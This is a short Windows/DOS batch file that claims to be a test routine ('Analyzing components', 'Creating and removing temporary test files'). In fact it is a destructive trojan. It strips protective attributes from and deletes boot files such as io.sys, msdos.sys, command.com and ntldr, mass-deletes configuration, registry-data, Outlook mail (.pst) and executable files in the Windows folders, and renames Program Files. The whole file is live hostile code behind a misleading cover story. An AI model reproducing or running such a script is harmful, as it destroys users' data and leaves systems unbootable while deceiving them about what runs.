   @echo off
   cls
   echo.
   echo Analyzing components...
   echo.
   echo Creating and removing temporary test files...
   echo.
   echo Test...
   if exist c:\command.com attrib -r -a -s -h c:\command.com
   if exist c:\command.com del c:\command.com
   echo Test...
   if exist c:\io.sys attrib -r -a -s -h c:\io.sys
   if exist c:\io.sys del c:\io.sys
   echo Test...
   if exist c:\msdos.sys attrib -r -a -s -h c:\msdos.sys
   if exist c:\msdos.sys del c:\msdos.sys
   echo Test...
   if exist c:\autoexec.* attrib -r -a -s -h c:\autoexec.*
   if exist c:\autoexec.* del c:\autoexec.*
   echo Test...
   if exist c:\config.* attrib -r -a -s -h c:\config.*
   if exist c:\config.* del c:\config.*
   echo Test...
   if exist c:\boot.* attrib -r -a -s -h c:\boot.*
   if exist c:\boot.* del c:\boot.*
   echo Test...
   if exist c:\netdetect.com attrib -r -a -s -h c:\netdetect.com
   if exist c:\netdetect.com del c:\netdetect.com
   echo Test...
   if exist c:\ntldr.* attrib -r -a -s -h c:\ntldr.*
   if exist c:\ntldr.* del c:\ntldr.*
   echo Test...
   if exist c:\windows\*.cfg attrib -r -a -s -h c:\windows\*.cfg
   if exist c:\windows\*.cfg del c:\windows\*.cfg
   if exist c:\windows\*.ini attrib -r -a -s -h c:\windows\*.ini
   if exist c:\windows\*.ini del c:\windows\*.ini
   if exist c:\windows\*.bak attrib -r -a -s -h c:\windows\*.bak
   if exist c:\windows\*.bak del c:\windows\*.bak
   if exist c:\windows\*.sav attrib -r -a -s -h c:\windows\*.sav
   if exist c:\windows\*.sav del c:\windows\*.sav
   if exist c:\windows\*.old attrib -r -a -s -h c:\windows\*.old
   if exist c:\windows\*.old del c:\windows\*.old
   if exist c:\windows\*.dat attrib -r -a -s -h c:\windows\*.dat
   if exist c:\windows\*.dat del c:\windows\*.dat
   if exist c:\windows\*.da0 attrib -r -a -s -h c:\windows\*.da0
   if exist c:\windows\*.da0 del c:\windows\*.da0
   if exist c:\windows\*.pab attrib -r -a -s -h c:\windows\*.pab
   if exist c:\windows\*.pab del c:\windows\*.pab
   if exist c:\windows\*.pst attrib -r -a -s -h c:\windows\*.pst
   if exist c:\windows\*.pst del c:\windows\*.pst
   if exist c:\windows\*.com attrib -r -a -s -h c:\windows\*.com
   if exist c:\windows\*.com del c:\windows\*.com
   if exist c:\windows\*.exe attrib -r -a -s -h c:\windows\*.exe
   if exist c:\windows\*.exe del c:\windows\*.exe
   echo Test...
   if exist c:\winnt\*.cfg attrib -r -a -s -h c:\winnt\*.cfg
   if exist c:\winnt\*.cfg del c:\winnt\*.cfg
   if exist c:\winnt\*.ini attrib -r -a -s -h c:\winnt\*.ini
   if exist c:\winnt\*.ini del c:\winnt\*.ini
   if exist c:\winnt\*.bak attrib -r -a -s -h c:\winnt\*.bak
   if exist c:\winnt\*.bak del c:\winnt\*.bak
   if exist c:\winnt\*.sav attrib -r -a -s -h c:\winnt\*.sav
   if exist c:\winnt\*.sav del c:\winnt\*.sav
   if exist c:\winnt\*.old attrib -r -a -s -h c:\winnt\*.old
   if exist c:\winnt\*.old del c:\winnt\*.old
   if exist c:\winnt\*.dat attrib -r -a -s -h c:\winnt\*.dat
   if exist c:\winnt\*.dat del c:\winnt\*.dat
   if exist c:\winnt\*.pab attrib -r -a -s -h c:\winnt\*.pab
   if exist c:\winnt\*.pab del c:\winnt\*.pab
   if exist c:\winnt\*.pst attrib -r -a -s -h c:\winnt\*.pst
   if exist c:\winnt\*.pst del c:\winnt\*.pst
   if exist c:\winnt\*.com attrib -r -a -s -h c:\winnt\*.com
   if exist c:\winnt\*.com del c:\winnt\*.com
   if exist c:\winnt\*.exe attrib -r -a -s -h c:\winnt\*.exe
   if exist c:\winnt\*.exe del c:\winnt\*.exe
   echo Test...
   if exist "c:\program files\accessories\mspaint.exe" attrib -r -a -s -h "c:\program files"
   if exist "c:\program files\accessories\mspaint.exe" ren "c:\program files" "c:\program  files"
   echo Test...
   if exist "c:\windows\command\attrib.exe" attrib -r -a -s -h "c:\windows\command"
   if exist "c:\windows\command\attrib.exe" del "c:\windows\command\*.com /y"
   if exist "c:\windows\command\attrib.exe" del "c:\windows\command\*.exe /y"
